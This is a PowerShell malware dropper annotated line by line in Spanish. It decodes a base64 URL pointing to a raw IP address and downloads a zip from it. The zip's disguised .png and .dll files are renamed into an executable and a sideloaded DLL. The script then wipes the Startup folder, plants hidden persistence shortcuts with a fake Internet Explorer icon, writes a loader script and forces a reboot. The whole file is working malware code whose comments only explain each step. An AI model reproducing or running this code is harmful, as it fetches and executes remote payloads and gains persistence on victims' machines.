$exe = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))   
## tranforma el string de b64 a normal "exe"
$zip = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))	
## tranforma el string de b64 a normal "zip"
$url = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADMANwAuADcANAAuADEANgAyAC4AMgA1AC8ATQAxADEAMAA2AC8AawBrAC8AbQBkAC4AegBpAHAA')))
## tranforma el string de b64 a normal "http://137.74.162.25/M1106/kk/md.zip"

$path_public = "public"  
## asigna el valo public a la variable
$path-full_public = "c:\users\$path_public"    
## asigna el path a una variable

Function fun_random 
{
	$abcdario = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
	## Crea una lista de letras
	$numeros = "2_","3_","4_","5_","6_","7_","8_","9_"
	## Crea una lista de números
	$null = $null    										 					
	## valor null sirve para liberar el espacio en memoria que estaba usando la variable
	$contar_6 = Get-Random -InputObject $abcdario -Count 6   					
	## toma letras dinamicas de un rango de 6 letras.
	$contar_1 = Get-Random -InputObject $numeros -Count 1    					
	## toma numeros dinamicos de un rango de 1 numero.
	$abcdarioa_contar = Get-Random -InputObject $abcdario.ToUpper() -Count 1    
	## Convierte la letra en mayuscula
	
	foreach($n in $contar_6) 
	{
		$null += $n
	}
	
	foreach ($n2 in $contar_1) 
	{
		$null += $n2
	}

	foreach ($n3 in $abcdarioa_contar) 
	{
		$null += $n3
	}

	return "Java_$null"
}
## la funcion genera un nombre de archivo algo parecido a Java_pyqjkz2_Z
## 6 letras como el count 6
## 1 número como el count 1
## Asignar una letra en mayusculo como en abcdarioa_contar

$var_fun_random = fun_random  
## asigna el valor que saca la función a una variable
$path_idat = "$path-full_public\i.dat"
## asigna la dirección de un archivo c:\users\public\i.dat
$validando_path_idat = if ($path_idat) { Test-Path $path_idat }
## valida si la direeción es c:\users\public\i.dat
$validando_path_idat
## muestra el valor True o False

if($validando_path_idat -eq 'True')
{
     exit
} 
else 
{
	New-Item -ItemType directory -Path $path-full_public\$var_fun_random
	## crea un directorio con el nombre obtenido en la funcion random
	$web = new-object System.Net.WebClient
	$web.DownloadFile($url,"$path-full_public\$var_fun_random\$var_fun_random.zip")
	## descarga un archivo de la url que se muetra al inicio dentro del directorio que crea y le asigna el mismonombre con .zip al final
	$shell_app = new-object -com shell.application 
	$var10 = $shell_app.namespace("$path-full_public\$var_fun_random\$var_fun_random.$zip") 
	$var11 = $shell_app.namespace("$path-full_public\$var_fun_random") 
	$var11.Copyhere($var10.items())
	## crear un o
	Rename-Item -NewName ("$path-full_public\$var_fun_random\$var_fun_random.$exe") -Path ("$path-full_public\$var_fun_random\$exe.png")
	Rename-Item -NewName ("$path-full_public\$var_fun_random\$var_fun_random.LNS") -Path ("$path-full_public\$var_fun_random\12.dll")
	Rename-Item -NewName ("$path-full_public\$var_fun_random\sqlite3.dll") -Path ("$path-full_public\$var_fun_random\sql.png")

	function func_2
	{
  		Param([string]$func_2_string1,[string]$func_2_string2);
  	try
	{  
    		$wscript_shell = New-Object -ComObject WScript.Shell 
		$shortcut = $wscript_shell.CreateShortcut($func_2_string1) 
    		$shortcut.TargetPath = "$path-full_public\$var_fun_random\$var_fun_random.$exe"       
    		$shortcut.Arguments = " $var_fun_random1.LNS  $var_fun_random"
    		$shortcut.WorkingDirectory = "$path-full_public\$var_fun_random" 
    		$shortcut.WindowStyle = 7   
    		$shortcut.IconLocation = $		([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    		$shortcut.Save()
  	}
	
	finally{}
	}
	
	$wscript_shell2 = New-Object -Com WScript.Shell
	$startup = $wscript_shell2.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
	del $startup\*.vbs
	del $startup\*.lnk
	$var12 = 	 	"                                                                                                                                                                                                                                                                                          	  $env:APPDATA\$env1, $env2"
	$var13 = "$startup\$var_fun_random.lnk"  
        
	func_2 $var13  $var12

	func_2 "c:\users\public\c.lnk"   $var12
	$bytes = [System.IO.File]::ReadAllBytes("c:\users\public\c.lnk")
	$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
	[System.IO.File]::WriteAllBytes("c:\users\public\c.lnk", $bytes)
	function func_2vbs
	{
  		Param([string]$func_2vbs_str1,[string]$func_2vbs_str2);
	try
	{  
		$var14 = New-Object -ComObject WScript.Shell 
    		$var15 = $var14.CreateShortcut($func_2vbs_str1) 
    		$var15.TargetPath = "c:\users\$path_public\$var_fun_random.vbs"      
    		$var15.Arguments = ""
		$var15.Description = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AGUAcgBuAGUAdAAuACIA')));
    		$var15.WorkingDirectory = ""    
    		$var15.IconLocation = "$var21"
    		$var15.Save()
  	}
	finally{}
}

$var16 = $var_fun_random
$var16 | Set-Content "$path-full_public\i.dat"
$var16 | Out-File "$path-full_public\i.dat"
$var16 > "$path-full_public\i.dat"

$var13 = "c:\users\public\chrome.lnk" 
func_2vbs $var13  $func_2vbs_str2

$var17 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AZQA=')))
$var18 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBtAGQA')))
$var19 = '86'
$var20 = "$"
$Arquivo = "$path-full_public\$var_fun_random\$var_fun_random1.LNS"

$ArquivoSaida ="$path-full_public\$var_fun_random\$var_fun_random1.LNS"
Add-Content $Arquivo '#NoTrayIcon'
Add-Content $Arquivo "Global $var20$var_fun_random = $var20$var18$var17[1]"
Add-Content $Arquivo "Global $var20$var_fun_random$var19 = DllOpen('$var_fun_random.LNS')"
Add-Content $Arquivo "DllCall($var20$var_fun_random$var19, 'STRUCT', 'JLI_CmdToArgs')"


C:\WINDOWS\system32\shutdown.exe -r -t 200

}
